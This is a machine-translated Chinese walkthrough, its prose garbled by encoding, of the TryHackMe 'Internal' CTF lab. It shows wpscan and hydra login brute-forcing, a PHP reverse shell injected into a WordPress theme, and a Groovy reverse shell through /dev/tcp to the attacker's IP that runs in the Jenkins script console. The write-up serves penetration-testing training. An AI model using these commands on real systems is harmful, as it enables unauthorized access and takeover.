# TryHackMe:å†…éƒ¨æŠ¥å‘Š

> åŸæ–‡ï¼š<https://infosecwriteups.com/tryhackme-internal-writeup-480ce471efdd?source=collection_archive---------0----------------------->

åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘å°†å±•ç¤ºæˆ‘å®Œæˆ**å†…éƒ¨** Capture The Flag (CTF)çš„æ–¹æ³•ï¼Œè¿™æ˜¯ä¸€ä¸ªç”± *TheMayor åˆ›å»ºçš„ TryHackMe å¹³å°ä¸Šçš„å…è´¹æ¸—é€æµ‹è¯•æŒ‘æˆ˜å®¤ã€‚*æˆ‘åœ¨ä¸‹é¢çš„å‚è€ƒèµ„æ–™ä¸­æä¾›äº† TryHackMe å¹³å°çš„é“¾æ¥ï¼Œä¾›æœ‰å…´è¶£è¯•ç”¨è¿™æ¬¾ CTF çš„äººå‚è€ƒã€‚

![](img/c208b887642eabc56cc52e8c3c80f5e3.png)

# æ”¾å¼ƒ

æˆ‘å–œæ¬¢åœ¨ä¸€ç¯‡æ–‡ç« ä¹‹å‰æ·»åŠ ä¸€ä¸ªç®€çŸ­çš„å…è´£å£°æ˜ï¼Œä»¥é¼“åŠ±äººä»¬åœ¨é˜…è¯»è¿™ç¯‡æ–‡ç« ä¹‹å‰å°è¯•ä¸€ä¸‹è¿™ä¸ªæˆ¿é—´ï¼Œå› ä¸ºåœ¨è¿™ç¯‡æ–‡ç« ä¸­æ˜¾ç„¶ä¼šæœ‰**å‰§é€****ã€‚æˆ‘ç›¸ä¿¡ï¼Œå¦‚æœä½ å…ˆè‡ªå·±å°è¯•ä¸€ä¸‹ï¼Œç„¶ååœ¨é‡åˆ°å›°éš¾æˆ–éœ€è¦æç¤ºæ—¶å†æ¥å†™è¿™ç¯‡æ–‡ç« ï¼Œä½ ä¼šæ›´å–œæ¬¢ CTFã€‚å› æ­¤ï¼Œæ²¡æœ‰ä»»ä½•è¿›ä¸€æ­¥çš„æ‹–å»¶ï¼Œè®©æˆ‘ä»¬å¼€å§‹å§ï¼**

# **CTF èƒŒæ™¯â€”å†…éƒ¨æµ‹è¯•**

**æˆ‘åœ¨ä¸‹é¢æä¾›äº†ä½œè€…åˆ›å»ºçš„é¡¹ç›®å‰ç®€æŠ¥çš„æ‘˜è¦ç‰ˆæœ¬ã€‚**

> **æ‚¨è¢«æŒ‡æ´¾ç»™ä¸€ä¸ªå®¢æˆ·ï¼Œè¯¥å®¢æˆ·å¸Œæœ›åœ¨ä¸€ä¸ªå°†äºä¸‰å‘¨å†…å‘å¸ƒåˆ°ç”Ÿäº§ç¯å¢ƒä¸­è¿›è¡Œæ¸—é€æµ‹è¯•ã€‚å®¢æˆ·ç«¯è¦æ±‚æ‚¨ä¿æŠ¤ä¸¤ä¸ªæ ‡å¿—(æœªæä¾›ä½ç½®)ä½œä¸ºæ”»å‡»çš„è¯æ®:**
> 
> **- **User.txt****
> 
> **- **Root.txt****
> 
> **æ­¤å¤–ï¼Œå®¢æˆ·è¿˜æä¾›äº†ä»¥ä¸‹èŒƒå›´æ´¥è´´:**
> 
> **-ç¡®ä¿ä¿®æ”¹æ‚¨çš„ä¸»æœºæ–‡ä»¶ä»¥åæ˜  **internal.thm****
> 
> **-æœ¬é¡¹ç›®ä¸­å…è®¸ä½¿ç”¨ä»»ä½•å·¥å…·æˆ–æŠ€æœ¯**
> 
> **-æ‰¾åˆ°å¹¶è®°å½•å‘ç°çš„æ‰€æœ‰æ¼æ´**
> 
> **-å°†å‘ç°çš„æ ‡å¿—æäº¤åˆ°ä»ªè¡¨æ¿**
> 
> **-åªæœ‰åˆ†é…ç»™æœºå™¨çš„ IP åœ°å€åœ¨èŒƒå›´å†…**
> 
> **æ³¨æ„:CTF çš„ä½œè€…ä¹Ÿé¼“åŠ±ç©å®¶æŠŠè¿™ä¸ªæŒ‘æˆ˜å½“ä½œä¸€ä¸ªçœŸæ­£çš„**æ¸—é€æµ‹è¯•**ï¼Œå› ä¸ºè¿™å°†æœ‰åˆ©äºä½ ä¸ºç”µå­å®‰å…¨ eCPPT æˆ–ä½œä¸ºè¯¥é¢†åŸŸæ¸—é€æµ‹è¯•å‘˜çš„èŒä¸šç”Ÿæ¶¯åšå‡†å¤‡ã€‚**

**å¯¹äºæœ¬æ–‡ï¼Œæˆ‘å°†åªå…³æ³¨æ£€ç´¢ç”¨æˆ·å’Œæ ¹æ ‡å¿—ã€‚**

# **åˆ—ä¸¾**

**æˆ‘é¦–å…ˆä¿®æ”¹äº†ä½äº **/etc/hosts** çš„ hosts æ–‡ä»¶ï¼Œå¹¶æŒ‰ç…§é¢„å…ˆçº¦å®šæ¦‚è¦çš„æŒ‡ç¤ºä¸º **internal.thm** åˆ›å»ºäº†ä¸€ä¸ªæ¡ç›®ã€‚**

```
10.10.252.171   internal.thm # entry in hosts file (use your own IP)
```

**æ¥ä¸‹æ¥ï¼Œæˆ‘å¼€å§‹ç”¨ **NMAP** æ‰«æç›®æ ‡æœºå™¨ï¼Œå¯»æ‰¾ä»»ä½•æ‰“å¼€çš„ç«¯å£ã€‚**

```
nmap -sV -sC -v -Pn -oN nmap_report 10.10.252.171
```

**NMAP å‘½ä»¤å¯ä»¥ç»†åˆ†å¦‚ä¸‹:**

*   ****-Pn** :ç¦ç”¨ä¸»æœºå‘ç°ã€‚**
*   ****-sV** :å¯¹æœåŠ¡è¿›è¡Œç‰ˆæœ¬æ£€æµ‹ã€‚**
*   ****-sC** :ä½¿ç”¨ NMAP æä¾›çš„é»˜è®¤è„šæœ¬æ‰§è¡Œè„šæœ¬æ‰«æã€‚**
*   ****-v** :æä¾›å…³äº NMAP æ‰«æçš„è¯¦ç»†ä¿¡æ¯ã€‚**
*   ****-oN** :å°†æ‰«æç»“æœè¾“å‡ºåˆ°æ–‡ä»¶ã€‚**

**æˆ‘æ‰¾åˆ°äº†ä¸¤ä¸ªå¼€æ”¾çš„ç«¯å£ï¼Œç«¯å£ 22 å’Œç«¯å£ 80ã€‚æˆ‘å†³å®šæ£€æŸ¥ç«¯å£ 80 ä¸Šæ‰˜ç®¡äº†ä»€ä¹ˆï¼Œå¹¶æ‰¾åˆ°äº† Apache2 çš„é»˜è®¤æ¬¢è¿é¡µé¢ã€‚**

**![](img/4257a5b8c50885c618ac3461c3d96ba2.png)**

**æ¥ä¸‹æ¥ï¼Œæˆ‘å†³å®šä½¿ç”¨ **GoBuster** ï¼Œçœ‹çœ‹æ˜¯å¦æœ‰éšè—çš„ç½‘é¡µæˆ–ç›®å½•ã€‚**

```
gobuster dir -u [http://internal.thm/](http://internal.thm/) -w /usr/share/wordlists/dirb/common.txt 
```

**GoBuster èƒ½å¤Ÿè¯†åˆ«å‡ ä¸ªæœ‰è¶£çš„éšè—ç½‘é¡µï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚**

**![](img/acd8d12197b84efa1fb90bc8c4457965.png)**

**æŸ¥çœ‹ **/blog** é¡µé¢ï¼Œæˆ‘å¯ä»¥çœ‹åˆ°ä¸€ä¸ªç®€å•çš„**åšå®¢ç«™ç‚¹è¢«æ‰˜ç®¡åœ¨ç›®æ ‡æœºå™¨ä¸Šã€‚****

**![](img/eac572e65a63b40f60e63271592992ae.png)**

**å‘ä¸‹æ»šåŠ¨é¡µé¢ï¼Œæˆ‘è¿˜å¯ä»¥çœ‹åˆ°ä¸€ä¸ªé“¾æ¥ï¼ŒæŠŠæˆ‘å¸¦åˆ°ä¸€ä¸ª wordpress ç™»å½•é¡µé¢ã€‚**

**![](img/580ddde20dacf2cc08d30f9e1ca91e95.png)**

**GoBuster è¿˜å‘ç°äº†ç¬¬äºŒä¸ªåä¸º **/phpmyadmin** çš„ç™»å½•é¡µé¢ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚**

**![](img/925a175a63d548025376fb28b8dfde0e.png)**

# ****æ˜“å—æ”»å‡»çš„ WordPress ç™»å½•****

**æˆ‘å†³å®šé¦–å…ˆå…³æ³¨ WordPress ç«™ç‚¹çš„ç™»å½•é¡µé¢ã€‚åœ¨å°è¯•äº†å‡ ä¸ªä¸åŒçš„å‡­è¯åï¼Œæˆ‘çœ‹åˆ°æ ¹æ®æˆ‘è¾“å…¥çš„ç”¨æˆ·åä¼šå‡ºç°ä¸åŒçš„é”™è¯¯æ¶ˆæ¯ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæˆ‘è¾“å…¥å‡­è¯ **test:test** ï¼Œå°†æ˜¾ç¤ºä»¥ä¸‹é”™è¯¯æ¶ˆæ¯ã€‚**

**![](img/49e2e5f78b222b36aa5321c0c3d90bd8.png)**

**ä½†æ˜¯ï¼Œå¦‚æœæˆ‘è¾“å…¥å‡­è¯ **admin:test** ï¼Œåˆ™ä¼šæ˜¾ç¤ºä¸åŒçš„é”™è¯¯æ¶ˆæ¯ã€‚è¿™å‘Šè¯‰æˆ‘æœ‰ä¸€ä¸ªåä¸º **admin** çš„ç”¨æˆ·ã€‚**

**![](img/496a738db9ccb5446eb88995701b4bbc.png)**

**çœ‹åˆ°è¿™ç§æƒ…å†µï¼Œæˆ‘å†³å®šä½¿ç”¨ **wpscan** å·¥å…·å°è¯•ä½¿ç”¨ **rockyou.txt å•è¯è¡¨**å¼ºåˆ¶ç”¨æˆ·å **admin** ç™»å½•ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚**

```
wpscan --url internal.thm/wordpress/ --passwords rockyou.txt --usernames admin --max-threads 50
```

**è¿™å¾ˆæœ‰æ•ˆï¼Œæˆ‘èƒ½å¤Ÿæ¢å¤ç”¨æˆ· admin çš„å¯†ç ã€‚**

**![](img/18c762aeb582d75020e66bb1051ce5a8.png)**

**æˆåŠŸç™»å½•åï¼Œæˆ‘å¼€å§‹å¯»æ‰¾ä»»ä½•æœ‰è¶£çš„ä¿¡æ¯ã€‚æˆ‘æ³¨æ„åˆ°åœ¨è¿™ä¸ªä¾‹å­ä¸­ä½¿ç”¨çš„ WordPress ç‰ˆæœ¬æ˜¯ **5.4.2** ã€‚æˆ‘è¿˜çœ‹åˆ°ç”¨æˆ· admin å‘äº†ä¸¤ä¸ªå¸–å­ï¼Œå…¶ä¸­ä¸€ä¸ªè®¾ç½®ä¸º privateï¼Œæ²¡æœ‰æ ‡é¢˜ã€‚çœ‹ç€è¿™ä¸ªå¸–å­ï¼Œæˆ‘æ‰¾åˆ°äº†ä¸€ç»„ç”¨æˆ· **william** çš„å‡­è¯ã€‚**

**![](img/4f288e6627608c7a40483b262b735326.png)**

# **WordPress åå‘å¤–å£³**

**å°½ç®¡æ‰¾åˆ°äº†è¿™äº›å‡­è¯ï¼Œæˆ‘è¿˜æ˜¯æ— æ³•ä½¿ç”¨å®ƒä»¬ SSH åˆ°ç›®æ ‡æœºå™¨æˆ–è€…ç™»å½•åˆ° **/phpmyadmin** é¡µé¢ã€‚åœ¨ç½‘ä¸Šæœç´¢äº†ä¸€ç•ªåï¼Œæˆ‘æ‰¾åˆ°äº†ä¸€ç¯‡æ–‡ç« (**è§å‚è€ƒæ–‡çŒ®**)ï¼Œå®ƒå±•ç¤ºäº†å‡ ç§ä¸åŒçš„è·å¾—é€†å‘ shell çš„æ–¹æ³•ã€‚ä¸€ç§æ–¹æ³•æ˜¯**åœ¨ WP_Theme** ä¸­æ³¨å…¥æ¶æ„ä»£ç ï¼Œé€šè¿‡å¯¼èˆªåˆ°*Appearances->Editor->404.php*ï¼Œç„¶åæ³¨å…¥ Pentestmonkey æä¾›çš„ PHP åå‘ shell(**å‚è§å‚è€ƒæ–‡çŒ®**)ã€‚æˆ‘åªæ˜¯æŠŠ PHP ä»£ç ä¸­çš„ IP åœ°å€å’Œç«¯å£å·æ”¹æˆäº†æˆ‘è‡ªå·±çš„ã€‚**

**![](img/aedf985a88315d7d71ce84e37888e069.png)**

**ç„¶åæˆ‘ç‚¹å‡»æŒ‰é’®**æ›´æ–°æ–‡ä»¶**å¹¶è®¾ç½® netcat ç›‘å¬ç«¯å£ 4444ã€‚æœ€åï¼Œæˆ‘å¯¼èˆªåˆ°ä¸‹é¢çœ‹åˆ°çš„ URL åœ°å€ï¼Œå¹¶ä»¥ç”¨æˆ· **www-data** çš„èº«ä»½åœ¨ç›®æ ‡æœºå™¨ä¸Šè·å¾—äº†ä¸€ä¸ªåå‘ shellã€‚**

```
http://internal.thm/wordpress/wp-content/themes/twentyseventeen/404.php
```

**![](img/ba8c030bf75abf14d4ab6668dc10b72d.png)**

# **ç”¨æˆ·æƒé™æå‡**

**è·å¾—ä¸€ä¸ªåå‘å¤–å£³åï¼Œæˆ‘å¼€å§‹å¯»æ‰¾æå‡æƒé™çš„æ–¹æ³•ã€‚æŸ¥çœ‹ä¸»ç›®å½•ï¼Œæˆ‘çœ‹åˆ°æœ‰ä¸€ä¸ªåä¸º **aubreanna** çš„ç”¨æˆ·ç›®å½•ï¼Œä½†æ˜¯æˆ‘æ²¡æœ‰æƒé™æŸ¥çœ‹å®ƒçš„å†…å®¹ã€‚**

**![](img/f65c3013c1af1d81c433f102b8dc9c70.png)**

**æ£€æŸ¥ **/etc** ç›®å½•æ—¶ï¼Œå¶ç„¶å‘ç°äº† **/phpmyadmin** ç›®å½•ã€‚é€šè¿‡æ£€æŸ¥è¿™ä¸ªç›®å½•ï¼Œæˆ‘èƒ½å¤Ÿæ‰¾åˆ° Gobuster ä¹‹å‰å‘ç°çš„ç™»å½•é¡µé¢çš„å‡­è¯ã€‚**

**![](img/c5b2e6a6c441c06164e508c6fcdc764c.png)**

**è¿™äº›å‡­è¯å…è®¸æˆ‘æˆåŠŸç™»å½•å¹¶æŸ¥çœ‹æ•°æ®åº“ï¼Œä½†æ˜¯æˆ‘æ²¡æœ‰æ‰¾åˆ°ä»»ä½•å…è®¸æˆ‘æå‡æƒé™çš„ä¸œè¥¿ã€‚æˆ‘è¿˜æ‰¾åˆ°äº†ä¸€ä¸ªåä¸º **/wordpress** çš„ç›®å½•ï¼Œå…¶ä¸­åŒ…å«äº†**WordPress æ•°æ®åº“çš„å‡­è¯ã€‚æˆ‘å¯ä»¥åœ¨ **/myphpadmin** ç™»å½•ç½‘é¡µä¸­ä½¿ç”¨è¿™äº›å‡­è¯æ¥æŸ¥çœ‹ wordpress æ•°æ®åº“ã€‚ç„¶è€Œï¼Œæˆ‘ä»ç„¶æ²¡æœ‰æ‰¾åˆ°ä»»ä½•æœ‰è¶£çš„ä¿¡æ¯ã€‚****

****![](img/915f1f2266e548902c4c7f71ae064302.png)****

****ç»è¿‡è¿›ä¸€æ­¥çš„æœç´¢ï¼Œæˆ‘åœ¨ **/opt** ç›®å½•ä¸­æ‰¾åˆ°äº†ä¸€ä¸ªåä¸º **wp-save.txt** çš„æœ‰è¶£æ–‡ä»¶ã€‚æ‰“å¼€è¿™ä¸ªæ–‡ä»¶ï¼Œæˆ‘èƒ½å¤Ÿæ‰¾åˆ°ç”¨æˆ· **aubreanna** çš„å‡­è¯ã€‚****

****![](img/df6164cdab1c9e36a62177718cb98a3c.png)****

****ä½¿ç”¨è¿™äº›å‡­è¯ï¼Œæˆ‘å¯ä»¥æˆåŠŸåœ° SSH åˆ°ç›®æ ‡æœºå™¨å¹¶è·å¾— **user.txt** æ ‡å¿—ã€‚****

****![](img/3809a6eb2ac7f842153c65d340f01bc5.png)****

# ****æ ¹æƒé™æå‡****

****è¿˜å‘ç°äº†ä¸€ä¸ªåä¸º **Jenkins.txt** çš„æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«ä¸€æ¡æœ‰è¶£çš„ä¿¡æ¯ã€‚****

****![](img/29b693f5c0c9bc985d5f2d9bd260c177.png)****

****æ˜¾ç„¶æœ‰ä¸€ä¸ª Jenkins æœåŠ¡åœ¨ç›®æ ‡æœºå™¨å†…éƒ¨è¿è¡Œã€‚æˆ‘å¯ä»¥ä½¿ç”¨ **SSH éš§é“**è¿æ¥åˆ°è¿™ä¸ªè¿œç¨‹æœåŠ¡ï¼Œå¹¶ä½¿å®ƒå¯ä»¥åœ¨æˆ‘çš„æœ¬åœ°æœºå™¨ä¸Šè®¿é—®(**å‚è§å‚è€ƒæ–‡çŒ®**)ã€‚ä¸ºäº†å®ç°è¿™ä¸€ç‚¹ï¼Œæˆ‘å¯ä»¥ç®€å•åœ°ä¸ SSH æœåŠ¡å™¨å»ºç«‹ä¸€ä¸ª SSH è¿æ¥ï¼Œå¹¶å‘Šè¯‰å®¢æˆ·ç«¯å°†æ¥è‡ªæˆ‘çš„æœ¬åœ°ä¸»æœºçš„ç‰¹å®šç«¯å£çš„æµé‡(å³ **localhost:4444** )è½¬å‘åˆ°æœåŠ¡çš„åœ°å€åŠå…¶ç«¯å£(å³ **172.17.0.2:8080** )ã€‚å®Œæ•´çš„å‘½ä»¤å¯ä»¥åœ¨ä¸‹é¢çœ‹åˆ°ã€‚****

```
**ssh -L 4444:172.17.0.2:8080 aubreanna@10.10.252.171**
```

****ç°åœ¨ï¼Œå½“æˆ‘åœ¨æµè§ˆå™¨ä¸­é”®å…¥ **localhost:4444** æ—¶ï¼Œå¯ä»¥è®¿é—® Jenkins æœåŠ¡çš„ç™»å½•é¡µé¢ã€‚****

****![](img/986dd4f306b147033440b6d395631ac7.png)****

****æˆ‘å†³å®šåœ¨ç›®æ ‡æœºå™¨çš„å…¶ä»–åœ°æ–¹å¯»æ‰¾ä¸€äº›éšè—çš„ç™»å½•å‡­è¯ï¼Œä½†æ˜¯æˆ‘ä»€ä¹ˆä¹Ÿæ‰¾ä¸åˆ°ã€‚åœ¨çº¿å¿«é€Ÿæœç´¢æ˜¾ç¤ºï¼ŒJenkins ç™»å½•çš„é»˜è®¤å‡­è¯æ˜¯**admin**/**password**ï¼Œä½†è¿™ä¹Ÿæ— æ³•å·¥ä½œã€‚æˆ‘æœ€ç»ˆå†³å®šå°è¯•ä½¿ç”¨ **hydra** å¼ºè¡Œç™»å½•ã€‚ä½¿ç”¨ chrome ä¸Šçš„å¼€å‘å·¥å…·ï¼Œæˆ‘æ£€æŸ¥äº†æäº¤å‡­è¯æ—¶ç™»å½•é¡µé¢ä½¿ç”¨äº†å“ªäº›å‚æ•°ã€‚****

****![](img/532db261c09137c0ede9e684185f5071.png)****

****æ¯æ¬¡å°è¯•ç™»å½•æ—¶ï¼Œéƒ½éœ€è¦æä¾›ä¸Šé¢ä»¥çº¢è‰²çªå‡ºæ˜¾ç¤ºçš„å‚æ•°ã€‚æˆ‘å†³å®šä½¿ç”¨ç”¨æˆ·å **admin** ï¼Œå› ä¸ºè¿™æ˜¯ Jenkins çš„é»˜è®¤ç”¨æˆ·åï¼Œå¹¶å°è¯•ä½¿ç”¨è¿™äº›å‚æ•°å¼ºè¡Œç ´è§£å¯†ç ã€‚****

```
**hydra 127.0.0.1 -s 4444 -V -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -l admin -P rockyou.txt**
```

****ä¹å¤´è›‡å¸ä»¤éƒ¨çš„è¯¦ç»†æƒ…å†µå¦‚ä¸‹:****

*   ******-s** :ç«¯å£å·****
*   ******-f** :ä¸€æ—¦æ‰¾åˆ°å¯†ç ï¼Œåœæ­¢æš´åŠ›ç ´è§£ç™»å½•é¡µé¢ã€‚****
*   ******-V** :æ˜¾ç¤ºä¹å¤´è›‡çš„ä¼å›¾ç­‰ç»†èŠ‚ã€‚****
*   ******http-form-post** :è¡¨ç¤ºæ­£åœ¨ä½¿ç”¨çš„è¡¨å•ç±»å‹(å³ post)ã€‚****
*   ******^USER^:** å‘Šè¯‰ä¹å¤´è›‡ä½¿ç”¨å­—æ®µä¸­çš„ç”¨æˆ·åæˆ–åˆ—è¡¨ã€‚****
*   ******^PASS^:** å‘Šè¯‰ä¹å¤´è›‡ä½¿ç”¨æä¾›çš„å¯†ç åˆ—è¡¨ã€‚****
*   ******-l:** è¡¨ç¤ºå•ä¸ªç”¨æˆ·åï¼Œä¾‹å¦‚â€œadminâ€(ä½¿ç”¨ **-L** æŸ¥çœ‹ç”¨æˆ·ååˆ—è¡¨)ã€‚****
*   ******-P:** è¡¨ç¤ºä½¿ç”¨ä»¥ä¸‹å¯†ç åˆ—è¡¨ï¼Œä¾‹å¦‚ **rockyou.txt******

****æ‰§è¡Œè¿™ä¸ªå‘½ä»¤å¯¼è‡´ç”¨æˆ· **admin** çš„å‡­è¯è¢«æ¢å¤ï¼Œå…è®¸æˆ‘ç™»å½•åˆ° Jenkinsã€‚****

****![](img/543136a226264dc60dd8fbc237dad3ca.png)****

****åœ¨ Google ä¸Šå¿«é€Ÿæœç´¢ä¼šå‘ç°è®¸å¤šåˆ©ç”¨ Jenkins æ¼æ´è·å¾—åå‘å¤–å£³çš„æ–¹æ³•ã€‚æˆ‘ä½¿ç”¨çš„æ–¹æ³•æ˜¯åˆ©ç”¨ Jenkins ä¸Šçš„**è„šæœ¬æ§åˆ¶å°**åŠŸèƒ½ã€‚****

****![](img/ca11b1b707c3a409538e8c6bfba83cec.png)****

****è¦åœ¨ç³»ç»Ÿä¸Šåˆ›å»ºä¸€ä¸ªåå‘ shellï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ Groovy è„šæœ¬ã€‚æ—¢ç„¶åŸºæœ¬éƒ½æ˜¯ Javaï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä¸€ä¸ª pentestmonkey çš„ Java åå‘ shellã€‚****

```
**r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.2.36.156/5555;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()**
```

****ç„¶åï¼Œæˆ‘å¯ä»¥ç›‘å¬ç«¯å£ 5555 ä¸Šçš„è¿æ¥ï¼Œå¹¶æˆåŠŸè·å¾—ä¸€ä¸ªåå‘ shellã€‚****

****![](img/09f6c76eae2c058c2d04f3147f940097.png)****

****æŸ¥çœ‹å®¹å™¨ç³»ç»Ÿï¼Œæˆ‘å‘ç°ä¸€ä¸ªå­˜å‚¨åœ¨ **/opt** ç›®å½•ä¸­çš„ **note.txt** æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«ä¸€æ¡æ¶ˆæ¯å’Œç”¨æˆ· root çš„å‡­è¯ã€‚****

****![](img/7ed2c16e6678767720b8624d009ea609.png)****

****ä½¿ç”¨è¿™äº›å‡­è¯ï¼Œæˆ‘å¯ä»¥ä½œä¸º root ç”¨æˆ· SSH å¹¶è·å¾— root æ ‡å¿—ğŸ˜ƒï¼****

****![](img/162b5dfeae3fb8fc2814a187aaf73946.png)****

# ****ç»“æŸè¯­****

****è¿™æ˜¯ TryHackMe å¹³å°ä¸Šæä¾›çš„ä¸€ä¸ªæœ‰è¶£ä¸”å…·æœ‰æŒ‘æˆ˜æ€§çš„ CTFã€‚æˆ‘å‘ç°è¿™æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„æ–¹æ³•æ¥å­¦ä¹ æ›´å¤šå…³äºæ¸—é€æµ‹è¯•çš„çŸ¥è¯†ï¼Œç»“åˆäº†å¹¿æ³›çš„æ˜“å—æ”»å‡»çš„æœåŠ¡æ¥åˆ©ç”¨å’Œæµ‹è¯•æŠ€æœ¯ã€‚æ„Ÿè°¢é˜…è¯»åˆ°æœ€åï¼Œç»§ç»­é»‘å®¢ï¼****

# ****å‚è€ƒ****

*   ****[https://tryhackme.com/](https://tryhackme.com/)****
*   ****[https://www.hackingarticles.in/wordpress-reverse-shell/](https://www.hackingarticles.in/wordpress-reverse-shell/)****
*   ****[https://github . com/pentestmonkey/PHP-reverse-shell/blob/master/PHP-reverse-shell . PHP](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)****
*   ****[https://www.howtogeek.com/168145/how-to-use-ssh-tunneling/](https://www.howtogeek.com/168145/how-to-use-ssh-tunneling/)****
*   ****[https://bentbrobotlabs . WordPress . com/2018/04/02/web-site-log in-brute-forcing-with-hydra/](https://bentrobotlabs.wordpress.com/2018/04/02/web-site-login-brute-forcing-with-hydra/)****
*   ****[https://www . n00py . io/2017/01/compromising-Jenkins-and-extracting-credentials/](https://www.n00py.io/2017/01/compromising-jenkins-and-extracting-credentials/)****